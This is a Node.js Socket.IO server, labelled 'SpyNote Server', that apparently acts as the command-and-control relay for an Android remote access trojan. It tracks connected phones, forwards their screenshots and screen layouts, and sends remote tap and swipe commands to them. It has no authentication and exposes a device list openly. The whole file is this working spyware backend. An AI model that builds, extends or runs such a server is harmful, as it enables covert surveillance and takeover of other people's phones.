const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '50mb' }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 New connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            socket.join(deviceId);
            console.log("📱 Device joined:", deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // 🔥 Layout relay (MOST IMPORTANT)
    socket.on('layout-update', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('layout-update', data);
            console.log('📐 Layout relayed:', deviceId);
        }
    });

    // Screenshot relay
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('screen-frame', data);
        }
    });

    // Control relay
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action, 
                x: parseFloat(x) || 0, 
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0, 
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0, 
                endY: parseFloat(endY) || 0
            });
            console.log('🎮 Control:', action, 'to', deviceId);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device disconnected:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server on port ${PORT}`);
    console.log(`🌐 Web: http://localhost:${PORT}`);
    console.log(`📱 Layout + Screenshot Ready!`);
});
